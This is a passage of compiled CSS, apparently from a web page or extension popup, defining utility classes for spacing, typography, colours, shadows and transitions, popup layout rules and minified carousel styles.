.px-1 {
  padding-left: 1px;
  padding-right: 1px;
}
.px-\[16px\] {
  padding-left: 16px;
  padding-right: 16px;
}
.px-\[3px\] {
  padding-left: 3px;
  padding-right: 3px;
}
.px-\[50px\] {
  padding-left: 50px;
  padding-right: 50px;
}
.px-\[60px\] {
  padding-left: 60px;
  padding-right: 60px;
}
.px-\[8px\] {
  padding-left: 8px;
  padding-right: 8px;
}
.px-md {
  padding-left: 24px;
  padding-right: 24px;
}
.px-sm {
  padding-left: 12px;
  padding-right: 12px;
}
.px-xs {
  padding-left: 6px;
  padding-right: 6px;
}
.py-0 {
  padding-top: 0px;
  padding-bottom: 0px;
}
.py-1 {
  padding-top: 1px;
  padding-bottom: 1px;
}
.py-\[3px\] {
  padding-top: 3px;
  padding-bottom: 3px;
}
.py-md {
  padding-top: 24px;
  padding-bottom: 24px;
}
.py-sm {
  padding-top: 12px;
  padding-bottom: 12px;
}
.py-xs {
  padding-top: 6px;
  padding-bottom: 6px;
}
.pb-0 {
  padding-bottom: 0px;
}
.pb-\[30px\] {
  padding-bottom: 30px;
}
.pb-\[3px\] {
  padding-bottom: 3px;
}
.pb-md {
  padding-bottom: 24px;
}
.pb-sm {
  padding-bottom: 12px;
}
.pb-xs {
  padding-bottom: 6px;
}
.pe-sm {
  padding-inline-end: 12px;
}
.pe-xs {
  padding-inline-end: 6px;
}
.pl-xs {
  padding-left: 6px;
}
.pr-\[160px\] {
  padding-right: 160px;
}
.pr-xs {
  padding-right: 6px;
}
.ps-sm {
  padding-inline-start: 12px;
}
.pt-0 {
  padding-top: 0px;
}
.pt-\[3px\] {
  padding-top: 3px;
}
.pt-\[60px\] {
  padding-top: 60px;
}
.pt-\[80px\] {
  padding-top: 80px;
}
.pt-md {
  padding-top: 24px;
}
.pt-sm {
  padding-top: 12px;
}
.pt-xs {
  padding-top: 6px;
}
.text-left {
  text-align: left;
}
.text-center {
  text-align: center;
}
.\!text {
  font-size: 12px !important;
}
.text {
  font-size: 12px;
}
.text-2xl {
  font-size: 20px;
}
.text-3xl {
  font-size: 24px;
}
.text-\[6px\] {
  font-size: 6px;
}
.text-base {
  font-size: 12px;
}
.text-lg {
  font-size: 14px;
}
.text-sm {
  font-size: 10px;
}
.text-xl {
  font-size: 16px;
}
.text-xs {
  font-size: 9px;
}
.font-bold {
  font-weight: 700;
}
.font-extrabold {
  font-weight: 800;
}
.font-medium {
  font-weight: 500;
}
.font-normal {
  font-weight: 400;
}
.font-semibold {
  font-weight: 600;
}
.font-thin {
  font-weight: 100;
}
.uppercase {
  text-transform: uppercase;
}
.capitalize {
  text-transform: capitalize;
}
.italic {
  font-style: italic;
}
.tracking {
  letter-spacing: 0.01em;
}
.text-\[\#9EBE58\] {
  --tw-text-opacity: 1;
  color: rgb(158 190 88 / var(--tw-text-opacity));
}
.text-\[\#CE372E\] {
  --tw-text-opacity: 1;
  color: rgb(206 55 46 / var(--tw-text-opacity));
}
.text-\[inherit\] {
  color: inherit;
}
.text-black {
  --tw-text-opacity: 1;
  color: rgb(29 32 34 / var(--tw-text-opacity));
}
.text-blue {
  --tw-text-opacity: 1;
  color: rgb(55 135 255 / var(--tw-text-opacity));
}
.text-blue-clicked {
  --tw-text-opacity: 1;
  color: rgb(12 99 231 / var(--tw-text-opacity));
}
.text-gray-100 {
  --tw-text-opacity: 1;
  color: rgb(175 175 177 / var(--tw-text-opacity));
}
.text-gray-500 {
  --tw-text-opacity: 1;
  color: rgb(137 137 138 / var(--tw-text-opacity));
}
.text-green-100 {
  --tw-text-opacity: 1;
  color: rgb(158 190 89 / var(--tw-text-opacity));
}
.text-pink-100 {
  --tw-text-opacity: 1;
  color: rgb(225 87 113 / var(--tw-text-opacity));
}
.text-pink-150 {
  --tw-text-opacity: 1;
  color: rgb(194 129 149 / var(--tw-text-opacity));
}
.text-pink-200 {
  --tw-text-opacity: 1;
  color: rgb(188 64 102 / var(--tw-text-opacity));
}
.text-pink-50 {
  --tw-text-opacity: 1;
  color: rgb(246 214 221 / var(--tw-text-opacity));
}
.text-pink-800 {
  --tw-text-opacity: 1;
  color: rgb(87 22 42 / var(--tw-text-opacity));
}
.text-red {
  --tw-text-opacity: 1;
  color: rgb(249 65 68 / var(--tw-text-opacity));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity));
}
.underline {
  text-decoration-line: underline;
}
.line-through {
  text-decoration-line: line-through;
}
.no-underline {
  text-decoration-line: none;
}
.opacity-0 {
  opacity: 0;
}
.opacity-100 {
  opacity: 1;
}
.opacity-20 {
  opacity: 0.2;
}
.opacity-25 {
  opacity: 0.25;
}
.opacity-40 {
  opacity: 0.4;
}
.opacity-45 {
  opacity: 0.45;
}
.opacity-60 {
  opacity: 0.6;
}
.opacity-75 {
  opacity: 0.75;
}
.opacity-80 {
  opacity: 0.8;
}
.mix-blend-multiply {
  mix-blend-mode: multiply;
}
.shadow-100 {
  --tw-shadow: 0px 4px 4px -2px rgba(24, 39, 75, 0.08), 0px 2px 4px -2px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 4px 4px -2px var(--tw-shadow-color), 0px 2px 4px -2px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-200 {
  --tw-shadow: 0px 8px 8px -4px rgba(24, 39, 75, 0.08), 0px 4px 6px -4px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 8px 8px -4px var(--tw-shadow-color), 0px 4px 6px -4px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-300 {
  --tw-shadow: 0px 8px 16px -6px rgba(24, 39, 75, 0.08), 0px 6px 8px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 8px 16px -6px var(--tw-shadow-color), 0px 6px 8px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-400 {
  --tw-shadow: 0px 8px 24px -4px rgba(24, 39, 75, 0.08), 0px 6px 12px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 8px 24px -4px var(--tw-shadow-color), 0px 6px 12px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-500 {
  --tw-shadow: 0px 10px 32px -4px rgba(24, 39, 75, 0.10), 0px 6px 14px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 10px 32px -4px var(--tw-shadow-color), 0px 6px 14px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-600 {
  --tw-shadow: 0px 12px 42px -4px rgba(24, 39, 75, 0.12), 0px 8px 18px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 12px 42px -4px var(--tw-shadow-color), 0px 8px 18px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-700 {
  --tw-shadow: 0px 14px 64px -4px rgba(24, 39, 75, 0.12), 0px 8px 22px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 14px 64px -4px var(--tw-shadow-color), 0px 8px 22px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.shadow-800 {
  --tw-shadow: 0px 18px 88px -4px rgba(24, 39, 75, 0.14), 0px 8px 28px -6px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 18px 88px -4px var(--tw-shadow-color), 0px 8px 28px -6px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
.outline-none {
  outline: 2px solid transparent;
  outline-offset: 2px;
}
.outline {
  outline-style: solid;
}
.outline-1 {
  outline-width: 1px;
}
.outline-\[2px\] {
  outline-width: 2px;
}
.outline-pink-100 {
  outline-color: #E15771;
}
.outline-white {
  outline-color: #FFFFFF;
}
.blur-2 {
  --tw-blur: blur(2.5px);
  filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
}
.grayscale {
  --tw-grayscale: grayscale(100%);
  filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
}
.filter {
  filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
}
.transition {
  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-backdrop-filter;
  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
  transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-backdrop-filter;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}
.transition-all {
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}
.transition-transform {
  transition-property: transform;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}
.duration-100 {
  transition-duration: 100ms;
}
.duration-200 {
  transition-duration: 200ms;
}
.duration-\[1\.5s\] {
  transition-duration: 1.5s;
}
.duration-\[3s\] {
  transition-duration: 3s;
}
.ease-in-out {
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.will-change-transform {
  will-change: transform;
}
/* Hide scrollbar for IE, Edge and Firefox */
.popup-position {
    width: 494px;
    top: 16px;
    right: 16px;
    bottom: 16px;
    position: fixed;
    z-index: 2147483647;
    overflow: hidden;
  }
.header-height {
    height: 52px;
  }
.popup-scroller-height {
    height: calc(100vh - (16px * 2) - 52px); /* subtracting popup padding and header */
  }
.nav-menu-height {
    max-height: calc(100vh - (16px * 2) - 52px - 52px);
    overflow-y: scroll;
  }

.grecaptcha-badge { visibility: hidden; }


/* manually included, bc of sandboxing */
/* @import 'react-responsive-carousel/lib/styles/carousel.min.css'; */
.carousel .control-arrow,.carousel.carousel-slider .control-arrow{transition:all .25s ease-in;opacity:.4;filter:alpha(opacity=40);position:absolute;z-index:2;top:20px;background:none;border:0;font-size:32px;cursor:pointer}.carousel .control-arrow:focus,.carousel .control-arrow:hover{opacity:1;filter:alpha(opacity=100)}.carousel .control-arrow:before,.carousel.carousel-slider .control-arrow:before{margin:0 5px;display:inline-block;border-top:8px solid transparent;border-bottom:8px solid transparent;content:''}.carousel .control-disabled.control-arrow{opacity:0;filter:alpha(opacity=0);cursor:inherit;display:none}.carousel .control-prev.control-arrow{left:0}.carousel .control-prev.control-arrow:before{border-right:8px solid #fff}.carousel .control-next.control-arrow{right:0}.carousel .control-next.control-arrow:before{border-left:8px solid #fff}.carousel-root{outline:none}.carousel{position:relative;width:100%}.carousel *{box-sizing:border-box}.carousel img{width:100%;display:inline-block;pointer-events:none}.carousel .carousel{position:relative}.carousel .control-arrow{outline:0;border:0;background:none;top:50%;margin-top:-13px;font-size:18px}.carousel .thumbs-wrapper{margin:20px;overflow:hidden}.carousel .thumbs{transition:all .15s ease-in;transform:translate3d(0, 0, 0);position:relative;list-style:none;white-space:nowrap}.carousel .thumb{transition:border .15s ease-in;display:inline-block;margin-right:6px;white-space:nowrap;overflow:hidden;border:3px solid #fff;padding:2px}.carousel .thumb:focus{border:3px solid #ccc;outline:none}.carousel .thumb.selected,.carousel .thumb:hover{border:3px solid #333}.carousel .thumb img{vertical-align:top}.carousel.carousel-slider{position:relative;margin:0;overflow:hidden}.carousel.carousel-slider .control-arrow{top:0;color:#fff;font-size:26px;bottom:0;margin-top:0;padding:5px}.carousel.carousel-slider .control-arrow:hover{background:rgba(0,0,0,0.2)}.carousel .slider-wrapper{overflow:hidden;margin:auto;width:100%;transition:height .15s ease-in}.carousel .slider-wrapper.axis-horizontal .slider{-ms-box-orient:horizontal;display:-moz-flex;display:flex}.carousel .slider-wrapper.axis-horizontal .slider .slide{flex-direction:column;flex-flow:column}.carousel .slider-wrapper.axis-vertical{-ms-box-orient:horizontal;display:-moz-flex;display:flex}.carousel .slider-wrapper.axis-vertical .slider{flex-direction:column}.carousel .slider{margin:0;padding:0;position:relative;list-style:none;width:100%}.carousel .slider.animated{transition:all .35s ease-in-out}.carousel .slide{min-width:100%;margin:0;position:relative;text-align:center}.carousel .slide img{width:100%;vertical-align:top;border:0}.carousel .slide iframe{display:inline-block;width:calc(100% - 80px);margin:0 40px 40px;border:0}.carousel .slide .legend{transition:all .5s ease-in-out;position:absolute;bottom:40px;left:50%;margin-left:-45%;width:90%;border-radius:10px;background:#000;color:#fff;padding:10px;font-size:12px;text-align:center;opacity:0.25;transition:opacity .35s ease-in-out}.carousel .control-dots{position:absolute;bottom:0;margin:10px 0;padding:0;text-align:center;width:100%;z-index:1}@media (min-width: 960px){.carousel .control-dots{bottom:0}}.carousel .control-dots .dot{transition:opacity .25s ease-in;opacity:.3;filter:alpha(opacity=30);box-shadow:1px 1px 2px rgba(0,0,0,0.9);background:#fff;border-radius:50%;width:8px;height:8px;cursor:pointer;display:inline-block;margin:0 8px}.carousel .control-dots .dot.selected,.carousel .control-dots .dot:hover{opacity:1;filter:alpha(opacity=100)}.carousel .carousel-status{position:absolute;top:0;right:0;padding:5px;font-size:10px;text-shadow:1px 1px 1px rgba(0,0,0,0.9);color:#fff}.carousel:hover .slide .legend{opacity:1}

.placeholder\:text-gray-100::-moz-placeholder {
  --tw-text-opacity: 1;
  color: rgb(175 175 177 / var(--tw-text-opacity));
}

.placeholder\:text-gray-100::placeholder {
  --tw-text-opacity: 1;
  color: rgb(175 175 177 / var(--tw-text-opacity));
}

.before\:absolute::before {
  content: var(--tw-content);
  position: absolute;
}

.before\:left-1\/2::before {
  content: var(--tw-content);
  left: 50%;
}

.before\:top-1\/2::before {
  content: var(--tw-content);
  top: 50%;
}

.before\:contents::before {
  content: var(--tw-content);
  display: contents;
}

.before\:h-full::before {
  content: var(--tw-content);
  height: 100%;
}

.before\:min-h-md::before {
  content: var(--tw-content);
  min-height: 24px;
}

.before\:w-full::before {
  content: var(--tw-content);
  width: 100%;
}

.before\:min-w-md::before {
  content: var(--tw-content);
  min-width: 24px;
}

.before\:-translate-x-1\/2::before {
  content: var(--tw-content);
  --tw-translate-x: -50%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

.before\:-translate-y-1\/2::before {
  content: var(--tw-content);
  --tw-translate-y: -50%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

.first\:rounded-t-edges:first-child {
  border-top-left-radius: 4px;
  border-top-right-radius: 4px;
}

.last\:rounded-b-edges:last-child {
  border-bottom-right-radius: 4px;
  border-bottom-left-radius: 4px;
}

.hover\:cursor-pointer:hover {
  cursor: pointer;
}

.hover\:border-2:hover {
  border-width: 2px;
}

.hover\:border-pink-100:hover {
  --tw-border-opacity: 1;
  border-color: rgb(225 87 113 / var(--tw-border-opacity));
}

.hover\:border-pink-50:hover {
  --tw-border-opacity: 1;
  border-color: rgb(246 214 221 / var(--tw-border-opacity));
}

.hover\:bg-gray-300:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(226 232 236 / var(--tw-bg-opacity));
}

.hover\:bg-green-200:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(100 120 56 / var(--tw-bg-opacity));
}

.hover\:bg-pink-20:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(235 224 240 / var(--tw-bg-opacity));
}

.hover\:bg-pink-50:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(246 214 221 / var(--tw-bg-opacity));
}

.hover\:bg-pink-50\/20:hover {
  background-color: rgb(246 214 221 / 0.2);
}

.hover\:fill-pink-150:hover {
  fill: #C28195;
}

.hover\:fill-pink-200:hover {
  fill: #BC4066;
}

.hover\:stroke-none:hover {
  stroke: none;
}

.hover\:stroke-white:hover {
  stroke: #FFFFFF;
}

.hover\:text-pink-200:hover {
  --tw-text-opacity: 1;
  color: rgb(188 64 102 / var(--tw-text-opacity));
}

.hover\:underline:hover {
  text-decoration-line: underline;
}

.hover\:no-underline:hover {
  text-decoration-line: none;
}

.hover\:shadow-100:hover {
  --tw-shadow: 0px 4px 4px -2px rgba(24, 39, 75, 0.08), 0px 2px 4px -2px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 4px 4px -2px var(--tw-shadow-color), 0px 2px 4px -2px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}

.hover\:outline:hover {
  outline-style: solid;
}

.hover\:outline-2:hover {
  outline-width: 2px;
}

.hover\:outline-pink-100:hover {
  outline-color: #E15771;
}

.hover\:outline-white:hover {
  outline-color: #FFFFFF;
}

.hover\:\[text-shadow\:_0\.5px_0px_0_currentColor\]:hover {
  text-shadow: 0.5px 0px 0 currentColor;
}

.focus\:outline-none:focus {
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.active\:bg-gray-50:active {
  --tw-bg-opacity: 1;
  background-color: rgb(245 245 245 / var(--tw-bg-opacity));
}

.active\:bg-green-200:active {
  --tw-bg-opacity: 1;
  background-color: rgb(100 120 56 / var(--tw-bg-opacity));
}

.active\:bg-pink-200:active {
  --tw-bg-opacity: 1;
  background-color: rgb(188 64 102 / var(--tw-bg-opacity));
}

.active\:bg-pink-50:active {
  --tw-bg-opacity: 1;
  background-color: rgb(246 214 221 / var(--tw-bg-opacity));
}

.active\:fill-none:active {
  fill: none;
}

.active\:fill-pink-200:active {
  fill: #BC4066;
}

.active\:stroke-gray-500:active {
  stroke: #89898A;
}

.active\:stroke-white:active {
  stroke: #FFFFFF;
}

.active\:font-semibold:active {
  font-weight: 600;
}

.active\:text-blue-clicked:active {
  --tw-text-opacity: 1;
  color: rgb(12 99 231 / var(--tw-text-opacity));
}

.active\:text-pink-150:active {
  --tw-text-opacity: 1;
  color: rgb(194 129 149 / var(--tw-text-opacity));
}

.active\:shadow-100:active {
  --tw-shadow: 0px 4px 4px -2px rgba(24, 39, 75, 0.08), 0px 2px 4px -2px rgba(24, 39, 75, 0.12);
  --tw-shadow-colored: 0px 4px 4px -2px var(--tw-shadow-color), 0px 2px 4px -2px var(--tw-shadow-color);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}

.active\:outline-none:active {
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.active\:outline-2:active {
  outline-width: 2px;
}

.active\:outline-white:active {
  outline-color: #FFFFFF;
}

.group:hover .group-hover\:fill-pink-200 {
  fill: #BC4066;
}

.group:hover .group-hover\:text-pink-200 {
  --tw-text-opacity: 1;
  color: rgb(188 64 102 / var(--tw-text-opacity));
}

.group:hover .group-hover\:\[text-shadow\:_0\.5px_0px_0_currentColor\] {
  text-shadow: 0.5px 0px 0 currentColor;
}

.group:active .group-active\:fill-pink-200 {
  fill: #BC4066;
}

.group:active .group-active\:text-pink-200 {
  --tw-text-opacity: 1;
  color: rgb(188 64 102 / var(--tw-text-opacity));
}

.data-\[state\=checked\]\:translate-x-\[15px\][data-state=checked] {
  --tw-translate-x: 15px;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

.data-\[disabled\]\:bg-gray-500[data-disabled] {
  --tw-bg-opacity: 1;
  background-color: rgb(137 137 138 / var(--tw-bg-opacity));
}

.data-\[state\=checked\]\:bg-pink-100[data-state=checked] {
  --tw-bg-opacity: 1;
  background-color: rgb(225 87 113 / var(--tw-bg-opacity));
}

.\[\&\:\:-webkit-scrollbar-thumb\]\:bg-gray-200::-webkit-scrollbar-thumb {
  --tw-bg-opacity: 1;
  background-color: rgb(206 214 222 / var(--tw-bg-opacity));
}

.hover\:\[\&\:\:-webkit-scrollbar-thumb\]\:bg-gray-400::-webkit-scrollbar-thumb:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(195 198 203 / var(--tw-bg-opacity));
}

.\[\&\:\:-webkit-scrollbar\]\:h-\[4px\]::-webkit-scrollbar {
  height: 4px;
}</style></div></template></div></div></body></html>
